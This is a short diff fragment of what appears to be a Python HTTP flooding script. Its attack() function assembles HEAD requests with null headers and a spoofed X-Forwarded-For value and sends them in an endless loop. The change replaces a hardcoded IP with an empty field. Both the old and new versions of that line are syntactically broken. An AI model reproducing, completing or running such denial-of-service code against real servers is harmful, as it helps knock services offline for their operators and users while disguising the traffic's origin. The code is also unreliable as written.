@@ -54,7 +54,7 @@ def randomip():
 def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"	
-  forward = X-Forwarded-For: 50.7.198.146
+  forward = X-Forwarded-For:
   get_host = "HEAD "  + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
